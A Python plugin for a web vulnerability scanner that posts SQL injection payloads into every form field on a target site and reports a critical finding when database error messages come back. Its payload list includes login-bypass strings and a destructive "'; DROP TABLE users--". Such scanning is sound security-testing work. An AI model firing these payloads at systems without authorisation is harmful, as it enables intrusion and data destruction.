def scan(scanner):
    """Scan for SQL Injection vulnerabilities"""
    print("[PLUGIN] Scanning for SQL Injection vulnerabilities...")
    sql_payloads = [
        "' OR '1'='1",
        "' OR 1=1--",
        "'; DROP TABLE users--",
        "' UNION SELECT NULL--",
        "admin'--",
        "1' AND '1'='1",
        "1' AND '1'='2"
    ]
    sql_errors = [
        'sql syntax',
        'mysql_fetch_array',
        'mysql_num_rows',
        'mysql_fetch_assoc',
        'mysql_fetch_object',
        'mysql_fetch_row',
        'mysql_fetch_field',
        'mysql error',
        'oracle error',
        'postgresql error',
        'sql server error',
        'microsoft ole db provider for sql server',
        'unclosed quotation mark after the character string',
        'quoted string not properly terminated'
    ]
    try:
        response = scanner.session.get(scanner.target_url, timeout=scanner.timeout)
        from bs4 import BeautifulSoup
        soup = BeautifulSoup(response.content, 'html.parser')
        forms = soup.find_all('form')
        for form in forms:
            form_action = form.get('action', '')
            form_method = form.get('method', 'get').lower()
            if form_action:
                test_url = scanner.urljoin(scanner.target_url, form_action)
            else:
                test_url = scanner.target_url
            inputs = form.find_all('input')
            for input_field in inputs:
                input_name = input_field.get('name')
                if input_name:
                    for payload in sql_payloads:
                        if form_method == 'post':
                            data = {input_name: payload}
                            try:
                                response = scanner.session.post(test_url, data=data, timeout=scanner.timeout)
                            except:
                                continue
                        else:
                            test_url_with_payload = f"{test_url}?{input_name}={scanner.urllib.parse.quote(payload)}"
                            try:
                                response = scanner.session.get(test_url_with_payload, timeout=scanner.timeout)
                            except:
                                continue
                        response_text = response.text.lower()
                        for error in sql_errors:
                            if error in response_text:
                                scanner.log_vulnerability(
                                    'SQL Injection',
                                    'Critical',
                                    f'SQL injection vulnerability detected in parameter {input_name}',
                                    f'Payload: {payload}, Error: {error}',
                                    'CWE-89'
                                )
                                break
    except Exception as e:
        print(f"[PLUGIN][SQLi] Error: {e}") 